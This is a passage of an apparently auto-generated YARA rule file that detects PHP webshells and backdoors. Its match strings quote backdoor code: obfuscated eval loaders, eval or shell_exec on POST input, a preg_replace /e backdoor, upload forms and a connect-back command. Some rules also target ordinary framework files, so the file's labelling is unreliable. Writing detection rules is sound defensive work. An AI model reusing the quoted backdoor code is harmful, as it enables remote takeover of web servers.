      $s20 = "WVM2QitSOOECkt0x1t5Hes+DJm7LI1JqkoIlwG//lp0o2mm99FGdncLbo/wpv/Yl1htmUqKIH5vGcScGLalK2mByksGcTK+jDud154ETc2rFF8hUK6tun3hs1HSYZWMP" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      1 of ($x*) and 4 of them
}

rule sig_80ec577dc3282bfa9a145c36b68483433d309d64
{
   meta:
      description = "php17 - file 80ec577dc3282bfa9a145c36b68483433d309d64.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7d7e5973df05786cc70e22f2e0411b4dab71026f05ad19b3466948401431a455"
   strings:
      $s1 = "$i='f($e){$k=$%>kh.$k%>f;ob_s%>ta%>rt();@ev%>al(@gzun%>compress%>(@x%>(@base%>%>64_%>decode(pr%>%>%>eg_replace(ar';" fullword ascii
      $s2 = "$r='>an();$d=b%>ase64_enc%>ode%>(x(gz%>compress%>($o%>),$k%>))%>;print(\"%><$k>$%>d</$k>\");@ses%>sion_d%>estroy();}}}}';" fullword ascii
      $s3 = "$u='rr=@%>$r%>[\"HTTP_REFE%>RER\"];$r%>a=@$r[\"%>%>HTT%>P_%>ACCE%>PT_L%>ANGUAGE\"];if($rr&&$ra)%>{$%>u=pars%>e_url($%>rr)';" fullword ascii
      $s4 = "$A='[$i%>]%>=\"\";$%>p=%>$ss($p,3);}if(a%>rra%>y_key_ex%>i%>%>st%>%>s($i,$s)){$s[$i].=$%>%>p;$e%>=strpos($s[$%>i],$f);i';" fullword ascii
      $s5 = "$E='$k%>h=\"5d41\";$kf=\"4%>0%>2a\";functi%>on x%>($t,$k)%>{$c=%>st%>rlen($k);$l=%>str%>len(%>$t);$o=%>\"\"%>;for($i=0;$i<$%>';" fullword ascii
      $s6 = "$z='>[\\\\d]))%>?,?/\",$%>ra%>,$m);if%>($%>q&&$m){@sessi%>on_s%>tart()%>;$s=%>&$_SES%>%>SION;$s%>s=\"substr\"%>;$s%>l=\"%';" fullword ascii
      $s7 = "$I=';parse_s%>tr($u%>[%>\"query\"]%>,$%>q);$q=arr%>ay_values($%>%>q);%>pr%>eg_match_all(\"%>/([%>\\\\w])[\\\\w-]+(%>?:;q=0.(%';" fullword ascii
      $s8 = "$p='>strtol%>ower\";$%>i=$m[1][0]%>.$m[1][1];$h%>=$sl%>($ss(m%>d5($i.$k%>h),0,%>%>3));$f=$sl($%>ss(m%>d5($i.$kf%>),0,';" fullword ascii
      $s9 = "$C='%>%>3));$p%>=%>\"\";for($z=1;%>$z<count($m[%>1]);$z%>++)$p.%>=$q[$m%>[2][$%>z]];if%>(strp%>os%>($p,$h)===0){%>$s';" fullword ascii
      $s10 = "$c='l;){f%>%>or($j=0;($j%><$%>c&&$%>i<$l);$j+%>+,$i++){$o.=%>$t{$i%>%>}^$k{$j};}%>%>}re%>turn $o;}$r=$_SER%>%>VER;$';" fullword ascii
      $s11 = "$h='ray(\"/%>_/\"%>,\"/-/\")%>,array(\"/\",\"+%>\"),$ss(%>$s[$i],%>0,$e%>)%>))%>%>,$k%>)));$o=o%>b_get_contents%>();ob_end%>_cle" ascii
      $s12 = "$s=str_replace('%>','',$E.$c.$u.$I.$z.$p.$C.$A.$i.$h.$r);" fullword ascii
      $s13 = "$w=str_replace('zh','','crezhazhtzhe_zhfzhunczhtion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule aa893e0418680ae73bb66b2f9cc41e427bcde75b
{
   meta:
      description = "php17 - file aa893e0418680ae73bb66b2f9cc41e427bcde75b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dceaf74a8ee1bd1aa557fd84709fa59140709df2fd5b252f1b1ba990a9a079ab"
   strings:
      $s1 = "* eval($_POST[\"c\"]);" fullword ascii
      $s2 = "$str=$rc->getDocComment();" fullword ascii
      $s3 = "* assert" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AccessMiddleware
{
   meta:
      description = "php17 - file AccessMiddleware.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dfab4fa1a636e65d1fdaa2cadbd27a0ab1f30c1742b4e94c2f134c5b0536cb4e"
   strings:
      $s1 = "return redirect()->route('dashboard.login');" fullword ascii
      $s2 = "* @param \\Illuminate\\Contracts\\Auth\\Guard $auth" fullword ascii
      $s3 = "* @param \\Closure $next" fullword ascii
      $s4 = "* AccessMiddleware constructor." fullword ascii
      $s5 = "/** @noinspection PhpInconsistentReturnPointsInspection */" fullword ascii
      $s6 = "if ($this->auth->user()->hasAccess('dashboard.index')) {" fullword ascii
      $s7 = "* @var Guard" fullword ascii
      $s8 = "namespace Orchid\\Platform\\Http\\Middleware;" fullword ascii
      $s9 = "public function __construct(Guard $auth)" fullword ascii
      $s10 = "return response('Unauthorized.', 401);" fullword ascii
      $s11 = "use Illuminate\\Contracts\\Auth\\Guard;" fullword ascii
      $s12 = "Carbon::setLocale(config('app.locale'));" fullword ascii
      $s13 = "if ($this->auth->guest()) {" fullword ascii
      $s14 = "if ($request->ajax() || $request->wantsJson()) {" fullword ascii
      $s15 = "* @param          $request" fullword ascii
      $s16 = "public function handle($request, Closure $next)" fullword ascii
      $s17 = "$this->auth = $auth;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule php17_6
{
   meta:
      description = "php17 - file 6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7feecf702ef226de50e4a43e5faaf8514a15ca01471bcbe7cbae7c84946cd9bf"
   strings:
      $x1 = "dbexec('UPDATE `#__edges` SET `type` = REPLACE(`type`, \\'ComHashtagsDomainEntityAssociation,com:hashtags.domain.entity.a" fullword ascii
      $s2 = "dbexec('DELETE FROM `#__components` WHERE `option` = \\'com_content\\' ');" fullword ascii
      $s3 = "dbexec('INSERT INTO `#__plugins` (`name`,`element`,`folder`,`iscore`,`published`) VALUES (\\'Mention\\', \\'mention\\',\\'con" fullword ascii
      $s4 = "dbexec('UPDATE `#__edges` SET `type` = REPLACE(`type`, \\'ComHashtagsDomainEntityAssociation,com:hashtags.domain.entity.associat" ascii
      $s5 = "dbexec('RENAME TABLE #__anahita_edges TO #__edges');" fullword ascii
      $s6 = "dbexec('INSERT INTO `#__plugins` (`name`,`element`,`folder`,`iscore`,`published`) VALUES (\\'Mention\\', \\'mention\\',\\'conten" ascii
      $s7 = "class ComAnahitaSchemaMigration6 extends ComMigratorMigrationVersion" fullword ascii
      $s8 = "* LICENSE: ##LICENSE##." fullword ascii
      $s9 = "* Schema Migration." fullword ascii
      $s10 = "//add the mention tag contentfilter" fullword ascii
      $s11 = "ssociation\\', \\'ComTagsDomainEntityTag,ComHashtagsDomainEntityTag,com:hashtags.domain.entity.tag\\') WHERE type LIKE \\'%com:h" ascii
      $s12 = "* Called when rolling back a migration." fullword ascii
      $s13 = "* Called when migrating up." fullword ascii
      $s14 = "if (!dbexists('SHOW TABLES LIKE \"#__edges\"')) {" fullword ascii
      $s15 = "ags.domain.entity%\\' ');" fullword ascii
      $s16 = "//changing the hashtag class name to tag" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      1 of ($x*) and 4 of them
}

rule sig_0266e33d3f546cb5436a10798e657d97
{
   meta:
      description = "php17 - file 0266e33d3f546cb5436a10798e657d97.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a0ef588f34581c804ee0e4907707edd121acbfb6cf105795fb4e16b04fe50b51"
   strings:
      $s1 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
      $s2 = "</form>'; if( $_POST['_upl'] == \"Upload\" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name']))" fullword ascii
      $s3 = "echo '<b>Upload Fail!</b><br><br></font>';" fullword ascii
      $s4 = "<input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\">" fullword ascii
      $s5 = "<font color:\"blue\">" fullword ascii
      $s6 = "echo '<input type=\"file\" name=\"file\" size=\"50\">" fullword ascii
      $s7 = "<span style=\"font-family: monospace;\">" fullword ascii
      $s8 = "<span style=\"color: rgb(255, 255, 255);\">" fullword ascii
      $s9 = "<h1> Uploading </h1>" fullword ascii
      $s10 = "echo '<b>Archivo subido!</b><br><br>';" fullword ascii
   condition:
      uint16(0) == 0x733c and filesize < 2KB and
      all of them
}

rule sig_046ddf96c233a273fd390c3d0b1a9aa4
{
   meta:
      description = "php17 - file 046ddf96c233a273fd390c3d0b1a9aa4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "91685c56f64b7376845e9fa62c100d2c424e1f8cfacba68a102ccb7c3b7e5763"
   strings:
      $s1 = "'Tf0tz*/$ZVe4pZrS1($atE4muYNLph($Pwp6))==$HLOTWYy3Ip6)$bIywY=$vUr($bAXD1h2s,/*'." fullword ascii
      $s2 = "'HNy*/$atE4muYNLph($wVYqzGy5.$BywtZ8QaHFk.$YzuZ.$PpCD4RJ914D.$IIBxK1GA_./*wQit'." fullword ascii
      $s3 = "'K8f-._$Js';$IXedwT=T&D;$ZVe4pZrS1=$ZAps4M|('^di'^';D]');$atE4muYNLph=(#Dfao7h'." fullword ascii
      $s4 = "'fLL*/wxGiDe.'}mOz[oKa~~7'.Owuug.'{~{n{';$rG4r3bseFJ='*n}Pqf-n#g'^#a_lCdbiaBRR'." fullword ascii
      $s5 = "'iGh o|';$YzuZ=n^')';$PpCD4RJ914D=\"+|*%\"^t0ck;$IIBxK1GA_=']_'&g_;$StoL=M&i;'Jb'." fullword ascii
      $s6 = "'  $;$G'|') %$$U')^$AKsSa;$vUr=$j5gQLS&('A^>1NQy%F+'.SHI8.'['^#Ereo6cpaZFW9p3w'." fullword ascii
      $s7 = "'=~'.KQnZo)^$L_X96rF;$ro74Wy=$yc|$Ulin;$OIYd=$mdKTVt&('ysO[r}'&'{w_[y}');if(/*'." fullword ascii
      $s8 = "'2c@lB!:Kru*/$PqU^$FtaeUxv;$bAXD1h2s=$rG4r3bseFJ^$rB;$O0Xnet=(\"9{\".SIkzl&#gIg3'." fullword ascii
      $s9 = "$XR='r0nw'&~Y0dTO1Wt;$ZAps4M='+l-'&')fw';$AKsSa=FAPZB.\" \"|HDAHH.'!';$j5gQLS=#XTQGk'." fullword ascii
      $s10 = "'&$YX8<&C1E$4 W5');$Pwp6=('!Pec|L'^VlMPH5)^('?h}go>'&'?k|s{y');$HLOTWYy3Ip6=/*'." fullword ascii
      $s11 = "'c{'.wwtw_w.'}~ov}oo'&'sw}o~w_w}~su}oo';$PqU=#li5cBcb42vVsRV4pLBKntygCNiV5lHCR'." fullword ascii
      $s12 = "'c>Q pir';$wVYqzGy5='u%!k*{il`'^'=qu;u#690';$BywtZ8QaHFk=_KELlmn&'_Wa~M[_';'BU'." fullword ascii
      $s13 = "'HA*:[ q`@}T@0ZLb>y M^@$@4@tA%0PI'|'@]'.kkR4UPA.'-'.PJt8_.'!Va%XB@RB0@'./*lCU5'." fullword ascii
      $s14 = "'m81-2Eu0~C';$rB='b1`]gAD~`A'|'!6`Ag@'.ptYG;$L_X96rF='kO>w=?~'&'Q{mw>7^';'yuBw'." fullword ascii
      $s15 = "'-.A';$yc='@@b @\"!'|'BBp)@`)';$mdKTVt=EcP791|UAFQ.\"<u\";$Ulin='4z#j1!K'^#IMQIwU'." fullword ascii
      $s16 = "'UP@0M*/TPc0PK;$FtaeUxv='}9Z~?V@[4~o}Mj>'.Z_zK.'?'.keFwUsOd.'^We}'&'}{zN?'./*n'." fullword ascii
      $s17 = "'NLNa~*/$StoL.$IXedwT));$bIywY($O0Xnet,$ro74Wy,$OIYd);#k;xvCWvgqQ!L>?10w:u&{E'." fullword ascii
      $s18 = "'@!*V9v939Jjr,?+kMW$8#{^v7[MR9pBS,PSH.o5}';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_6230c5b8b63c98b9cbd5d08818099892308fcf3e
{
   meta:
      description = "php17 - file 6230c5b8b63c98b9cbd5d08818099892308fcf3e.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e76556cb2da33255fe9dc962b38f9958d724ab49ab5e0f46794a3ced6aa19335"
   strings:
      $s1 = "'cbjxcbjxcbkvrbpDLL0wkzBDbhxtcbjxcbjxcbjxcbjxcbjxcw0iSwjE5+jUL72iL9KGkW2qsXdxrNE68bjxcbj'." fullword ascii
      $s2 = "$fniugcedad = 2123; function jowjbbfgf($bjwcdt, $oqxptpei){$zfayp = ''; for($i=0; $i < strlen($bjwcdt); $i++){$zfayp .= isset($" fullword ascii
      $s3 = "V', 'n'=>'f', 'q'=>'W', 'p'=>'P', 's'=>'9', 'r'=>'k', 'u'=>'U', 't'=>'i', 'w'=>'n', 'v'=>'G', 'y'=>'8', 'x'=>'C', 'z'=>'h');" fullword ascii
      $s4 = "'bpDLlMGLNM9HmdxHrdeNhxtcbjxcbjxcbjxcbjxcbjxcrSwm5KGhnARklAiHmMtcsjvKR0Om5KDbrKt7b'." fullword ascii
      $s5 = "$nipjze = 'E68hxrLlMOmn09o5dxAm0wkY0msNM90wFxL3ouV1deNhxrLlMOmn09o5dxANM9AnKGkPMRkWkP7b1xrTE6lc2q4lGRhmAxbwMq'." fullword ascii
      $s6 = "'CQG9oQKqhZAvmYMms52qZmkP7b1xrTE6lcKGkPMRkn0Oo7MRk52q4wdEcl375d6ihmACs52qZmG9'." fullword ascii
      $s7 = "'6ioX09oP2qCN2GlmdvhWG9HmSRk40i68SOCWKeS5G9HmS9srKDbrS9sXKOmwdD7bMq6ZdvhWG9AmACsaAGkPKq45G9KlM'." fullword ascii
      $s8 = "'cbjxcrH5Vp6rC1uZNwSRhnSGo52xAAjE5bk967KeuRSe07Fe67hWSfhEKO1DZz1WLtFekOKvjWKqU7hq6P3D0TE68bjxcbK9VY'." fullword ascii
      $s9 = "//2bef5f45fb5f5af8a97f4ff644571c2bN2gxaXl0OTZxdHE1cG5pfT05LzU2bz45DHJ1ImlvPj59fjsocWtxMWMxNW04MyNhNGBqPzx3JzNtYCdvKyE5c2dpZzxhLi" ascii
      $s10 = "'bjxcbjxcbjvKY0OozS9bbdvhWG9AmACs7Miow2q4nS9sXKOmwdxrbSG1bkiLXSqZmpeQr0vhYMwHmMw6lE68bjxcbjxcbjiNhxtc'." fullword ascii
      $s11 = "'68bjxcbKvoO2q4mdxk6DCLnHus1jt7bjmVXjtrTE6lsE68hxOmOdxCrKqKlMOordxkUDokC6ZHpummnu5o66okLoUsDjtrlE6lT'." fullword ascii
      $s12 = "'YMtLO2qVmG9AmACsaM945Kq450PbrKOmNKq4zMqulE68bjxcbjxcbjiNhxtcbjxcbjxcbjxcbjxHO2vCXKvVmjE5bKOs7K'." fullword ascii
      $s13 = "'5Kq45jE5b0RHPGRkm0vVzS9u8kvhYMOKlKZsYMv6NjxHaM94O2qAnKq4aFxcr09oNKmsaM945Kq45deNhxb5djxcbjxcbjxL'." fullword ascii
      $s14 = "'Pbr0vVZK9mX0PrTE68bjxcbn65dE68bjxcbKwoXSRHlM9QbSRhn0vVZK9mXG9VYSq68kv4zMqusemo1exrhxtcbjxLTE68'." fullword ascii
      $s15 = "'kv6l375djxcbjxcbjxcbjxcbjxcbjvKaMvsWKDbrKtrTE68bjxcbjxcbjxcbjxcbjxcb0Oo5AGkXjxHtBGHm0ZsR0Om5AvoX3'." fullword ascii
      $s16 = "'h52qsXjvhWG9HmSRk40i68kvHzAvUNjxHgKGrlE68bjxcbB75djxcbjxcbjxLwMvstSq7bkvhWG9CZAvbTE68hxtcbjxcb'." fullword ascii
      $s17 = "'Avb8dDrTE68hxtcbjxcbjxcbkvhYMOKlKZs7MR1bpDLWAik7MR18kihmMvKnS9sXAvoXAx7bMq6ZdvhWG9AmACsaAGkPKq4'." fullword ascii
      $s18 = "'jxcb0Oo5AGkXjvhWG9HmSRk40iHn0vzz09u8SRhnKvoa0wm7ACs72vCWKDbrKvC5SD7bkvfmBDrNjxHa0ZszAGH8deNh'." fullword ascii
      $s19 = "'bjxcbjxcbjvmOjxbrKtcspe5bHOCN09ulE68bjxcbjxcbjxcbjxLTE68bjxcbjxcbjxcbjxcbjxcb0Oo5AGkXjEc'." fullword ascii
      $s20 = "'qVm09mIKDbrKOmNKq4zMquldeNhxtcbjxcbjxcbjxcbjvKaMvsWKDbrKOzzMOHNKDrTE68hxtcbjxcbjxcbjxcbj'." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 80KB and
      8 of them
}

rule a1495d2f71d54c48c734786d4845953c894908df
{
   meta:
      description = "php17 - file a1495d2f71d54c48c734786d4845953c894908df.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "69dfca5dade343714567f461ae3e8519284cdb5996230b6195cb7bbad7d01903"
   strings:
      $x1 = "<center><input type=submit value='File List' name=filelist> - <input type=submit value='View PhpInfo' name=phpinfo> - <input typ" ascii
      $x2 = "='Cmd Execution' name='commex'> - <input type='submit' name='logeraser' value='Logs Eraser'> - <input type='submit' name='connec" ascii
      $s3 = "// Dump Database [pacucci.com]" fullword ascii
      $s4 = "if(isset($_POST['dump']) && isset($user) && isset($pass) && isset($db)){" fullword ascii
      $s5 = "$millink=\"http://milw0rm.com/search.php?dong=Linux Kernel\".$Lversion;" fullword ascii
      $s6 = "$mysql = mysql_connect(\"localhost\", $user, $pass)or die(\"<script>alert('Connection Failed')</script>\");" fullword ascii
      $s7 = "$aids = passthru(\"perl cbs.pl \".$_POST['connhost'].\" \".$_POST['connport']);" fullword ascii
      $s8 = "$dump = \"-- Database: \".$_POST['db'] .\" \\n\";" fullword ascii
      $s9 = "<input type='submit' value='Sorguyu Calistir' name='godb'><br><input type='submit' name='dump' value='Database'yi Dump Et'>" fullword ascii
      $s10 = "$headers .= \"\\r\\nContent-Type: multipart/alternative; boundary=\\\"PHP-alt-\".$random_hash.\"\\\"\";" fullword ascii
      $s11 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='http://whois.domaintools.com/\". $_SERVER['SERVER_A" ascii
      $s12 = "<b>IP:</b> <u>\" . $_SERVER['REMOTE_ADDR'] .\"</u> - Server IP:</b> <a href='http://whois.domaintools.com/\". $_SERVER['SERVER_A" ascii
      $s13 = "<font size='1' face='Verdana'>Username: - Password:</font><br>" fullword ascii
      $s14 = "$dump .= \"-- CWShellDumper v3\\n\";" fullword ascii
      $s15 = "shell_exec(stripslashes($_POST['cmd']));" fullword ascii
      $s16 = "exec(stripslashes($_POST['cmd']));" fullword ascii
      $s17 = "<form method='post' action=''><input type='text' name='connhost' size='15'value='target'> <input type='text' name='connport' siz" ascii
      $s18 = "elseif(eregi('config',$listz) && eregi('.php',$listz)) { @$listf.= '<tr><td valign=top><img src=?com=image&img=file><font siz" fullword ascii
      $s19 = "$millink=\"http://milw0rm.com/search.php?dong=\".$OSV.\" \".$Lversion;" fullword ascii
      $s20 = "<center><b><font size='2' face='Verdana'>Safe-Mode Bypass[Dosyalar]<br></font></b>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule AdminPageValidate
{
   meta:
      description = "php17 - file AdminPageValidate.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1cad63ed83fe494e7bbbc71271a6d8595536069ccd52a9c9f2c65c0dacf70906"
   strings:
      $s1 = "// | Copyright (c) 2013-2018 http://www.thinkcmf.com All rights reserved." fullword ascii
      $s2 = "//        'add'  => ['user_login,user_pass,user_email']," fullword ascii
      $s3 = "// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )" fullword ascii
      $s4 = "< 449134904@qq.com>" fullword ascii
      $s5 = "//        'edit' => ['user_login,user_email']," fullword ascii
      $s6 = "// +----------------------------------------------------------------------" fullword ascii
      $s7 = "$fullUrl    = $routeModel->buildFullUrl('portal/Page/index', ['id' => $data['id']]);" fullword ascii
      $s8 = "'post_alias' => 'checkAlias'" fullword ascii
      $s9 = "'post_title.require' => '" fullword ascii
      $s10 = "'post_title' => 'require'," fullword ascii
      $s11 = "namespace app\\portal\\validate;" fullword ascii
      $s12 = "protected function checkAlias($value, $rule, $data)" fullword ascii
      $s13 = "if (!$routeModel->exists($value, $fullUrl)) {" fullword ascii
      $s14 = "use app\\admin\\model\\RouteModel;" fullword ascii
      $s15 = "// | Author: " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule AddressSettings
{
   meta:
      description = "php17 - file AddressSettings.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a47d90f19df24fea07e1dabcc52493f4e131ee8782c517d92448553c363cbb51"
   strings:
      $s1 = "* Should we try to determine the Country starting from the visitor's IP address?" fullword ascii
      $s2 = "* @ORM\\Table(name=\"atAddressSettings\")" fullword ascii
      $s3 = "* @ORM\\Column(type=\"boolean\", nullable=false)" fullword ascii
      $s4 = "* @ORM\\Column(type=\"string\", nullable=true)" fullword ascii
      $s5 = "* @ORM\\Column(type=\"json_array\")" fullword ascii
      $s6 = "* @ORM\\Column(type=\"boolean\")" fullword ascii
      $s7 = "namespace Concrete\\Core\\Entity\\Attribute\\Key\\Settings;" fullword ascii
      $s8 = "* @param mixed $hasCustomCountries" fullword ascii
      $s9 = "* @param mixed $customCountries" fullword ascii
      $s10 = "* @param mixed $defaultCountry" fullword ascii
      $s11 = "* @param bool $value" fullword ascii
      $s12 = "* @ORM\\Entity" fullword ascii
      $s13 = "public function getDefaultCountry()" fullword ascii
      $s14 = "public function getCustomCountries()" fullword ascii
      $s15 = "public function setHasCustomCountries($hasCustomCountries)" fullword ascii
      $s16 = "use Doctrine\\ORM\\Mapping as ORM;" fullword ascii
      $s17 = "$this->akHasCustomCountries = $hasCustomCountries;" fullword ascii
      $s18 = "public function setCustomCountries($customCountries)" fullword ascii
      $s19 = "public function setDefaultCountry($defaultCountry)" fullword ascii
      $s20 = "protected $akHasCustomCountries = false;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule sig_1e5c6558486db6333246ee2580bafde628af6cda
{
   meta:
      description = "php17 - file 1e5c6558486db6333246ee2580bafde628af6cda.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "60505a1d3406e698abd0d1019aff73029d23af426a60672d85780d0f6517fccf"
   strings:
      $x1 = "echo sp(3).buildUrl( $img[\"Execute\"], \"cmd=execute&file=$dir/$file\").\"\\n\";" fullword ascii
      $x2 = "elseif ( $cmd==\"execute\" ) {/*<!-- Execute the executable -->*/" fullword ascii
      $x3 = "is coded for unsecure servers, if your server is secured the script will hide commands" fullword ascii
      $x4 = "elseif ( $cmd==\"uploadproc\" ) {" fullword ascii
      $x5 = "<input name=\"submit_btn\" class=\"inputbutton\" type=\"submit\" value=\"Execute Command\"></p>" fullword ascii
      $s6 = "<br>PHPKonsole is just a little telnet like shell wich allows you to run commands on the webserver." fullword ascii
      $s7 = "/* HTTP Authorisation password, uncomment if you want to use this */" fullword ascii
      $s8 = "When you run commands they will run as the webservers UserID. This should work perfectly" fullword ascii
      $s9 = "elseif ( $cmd==\"edit\" ) {" fullword ascii
      $s10 = "/* <!-- Execute --> */" fullword ascii
      $s11 = "<center>&nbsp;<?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?>&nbsp;</center>" fullword ascii
      $s12 = "header(\"Content-Disposition: attachment; filename=$downloadto$add\");" fullword ascii
      $s13 = "*                               DRAZZ01@HOTMAIL.COM                                     * " fullword ascii
      $s14 = "<font size=3><?php echo $scriptident ?> - <?php echo $scriptver ?> - <?php echo $scriptdate ?></font>" fullword ascii
      $s15 = "elseif ( $cmd==\"saveedit\" ) {" fullword ascii
      $s16 = "elseif ( $cmd==\"deldir\" ) {" fullword ascii
      $s17 = "elseif ( $cmd==\"newdir\" ) {" fullword ascii
      $s18 = "<!-- <?php echo $scriptident ?>, <?php echo $scriptver ?>, <?php echo $scriptdate ?>  -->" fullword ascii
      $s19 = "server supports php and the execute commands...<br><br>" fullword ascii
      $s20 = "for managing files, like moving, copying etc. If you're using a linux server, system commands" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule ac9d12b292485653860a0feee1e80728b62aa789
{
   meta:
      description = "php17 - file ac9d12b292485653860a0feee1e80728b62aa789.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3c7f22c9123e04109df7ec11a9a94cc1b552d0ab33f2b2e5e35deacf27841f2c"
   strings:
      $s1 = "<span style=\"font-size: 11px; font-family: Verdana\">Password: </span><input name=\"adminpass\" type=\"password\" size=\"20\">" fullword ascii
      $s2 = "<a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">Security Angel</a> " fullword ascii
      $s3 = "<a href=\\\"http://www.4ngel.net\\\" target=\\\"_blank\\\">www.4ngel.net</a> " fullword ascii
      $s4 = "angel [<a href=\\\"http://www.bugkidz.org\\\" target=\\\"_blank\\\">BST</a>] " fullword ascii
      $s5 = "$phpinfo=(!eregi(\"phpinfo\",$dis_func)) ? \" | <a href=\\\"?action=phpinfo\\\" target=\\\"_blank\\\">PHPINFO()</a>\" : \"\";" fullword ascii
      $s6 = "echo \"  <td style=\\\"padding-left: 5px;\\\"><a href=\\\"$filepath\\\" target=\\\"_blank\\\">$file</a></td>\\n\";" fullword ascii
      $s7 = "<option value=\"shell_exec\" <? if ($execfunc==\"shell_exec\") { echo \"selected\"; } ?>>shell_exec</option>" fullword ascii
      $s8 = "<option value=\"passthru\" <? if ($execfunc==\"passthru\") { echo \"selected\"; } ?>>passthru</option>" fullword ascii
      $s9 = "$shellmode=(!get_cfg_var(\"safe_mode\")) ? \" | <a href=\\\"?action=shell\\\">WebShell</a>\" : \"\";" fullword ascii
      $s10 = "</a><?=$phpinfo?><?=$shellmode?> | <a href=\"?action=sql\">SQL Query</a> | <a href=\"http://www.4ngel.net\" target=\"_blank\" ti" ascii
      $s11 = "<option value=\"system\" <? if ($execfunc==\"system\") { echo \"selected\"; } ?>>system</option>" fullword ascii
      $s12 = "<option value=\"exec\" <? if ($execfunc==\"exec\") { echo \"selected\"; } ?>>exec</option>" fullword ascii
      $s13 = "<option value=\"popen\" <? if ($execfunc==\"popen\") { echo \"selected\"; } ?>>popen</option>" fullword ascii
      $s14 = "echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],\"\".$uploaddir.\"/\".$_FILES['uploadmyfile']['name'].\"\") ? \"" fullword ascii
      $s15 = "if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {" fullword ascii
      $s16 = "<form action=\"?action=shell&dir=<?=urlencode($dir)?>\" method=\"POST\">" fullword ascii
      $s17 = "header('Content-Description: PHP Generated Data');" fullword ascii
      $s18 = "<td align=\"center\"><textarea name=\"filecontent\" cols=\"100\" rows=\"20\"><?=$contents?></textarea></td>" fullword ascii
      $s19 = "echo \"<meta http-equiv=\\\"refresh\\\" content=\\\"3;URL=\".$self.\"\\\">\";" fullword ascii
      $s20 = "<input type=\"submit\" name=\"login\" value=\"OK\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule sig_6358fdf62a2ab93a03a9f274743184baa0ef1a73
{
   meta:
      description = "php17 - file 6358fdf62a2ab93a03a9f274743184baa0ef1a73.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b2ddb3d426b8a55ac55c5d4bd1115825e517a3b15df19f90816d5257dcc9281f"
   strings:
      $s1 = "@preg_replace(\"/[pageerror]/e\",$_POST['error'],\"saft\");" fullword ascii
      $s2 = "header('HTTP/1.1 404 Not Found');" fullword ascii
      $s3 = "<p>The requested URL was not found on this server.</p>" fullword ascii
   condition:
      uint16(0) == 0x213c and filesize < 1KB and
      all of them
}

rule sig_6b51b0cded5f602cac58bd1fc04eace4
{
   meta:
      description = "php17 - file 6b51b0cded5f602cac58bd1fc04eace4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "55fd231f5d99c481ba331a9c9fefe827fad610d644db5fdfa3b214cb7e65588a"
   strings:
      $s1 = ".$syam26[6]. $syam26[7]. $syam26[0].$syam26[3]. $syam26[8]. $syam26[7]. $syam26[0] );$kasd1= strtoupper ( $syam26[6]. $syam26[5" fullword ascii
      $s2 = "$syam26=\"etsc6p_doba4\"; $cco37 = strtolower ( $syam26[9]. $syam26[10].$syam26[2]. $syam26[0].$syam26[4]. $syam26[11]" fullword ascii
      $s3 = "]. $syam26[8].$syam26[2]. $syam26[1] );if ( isset(${$kasd1}['n46b398' ])){ eval($cco37(${ $kasd1}[ 'n46b398' ] ) );} ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2_0_1_pl
{
   meta:
      description = "php17 - file 2.0.1-pl.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "263b588189e3fe780522f3437068e1d1d52ff825056d5010d31d50e114152e52"
   strings:
      $s1 = "* Specific upgrades for Revolution 2.0.1" fullword ascii
      $s2 = "$action = $this->install->xpdo->getObject('modAction',array(" fullword ascii
      $s3 = "* @subpackage upgrades" fullword ascii
      $s4 = "* @package setup" fullword ascii
      $s5 = "'resource/staticresource/update'," fullword ascii
      $s6 = "'resource/staticresource/create'," fullword ascii
      $s7 = "/* remove some deprecated actions */" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule php17__items
{
   meta:
      description = "php17 - file _items.php"
      author = "WatcherLab"
      date = "2019-02-23"
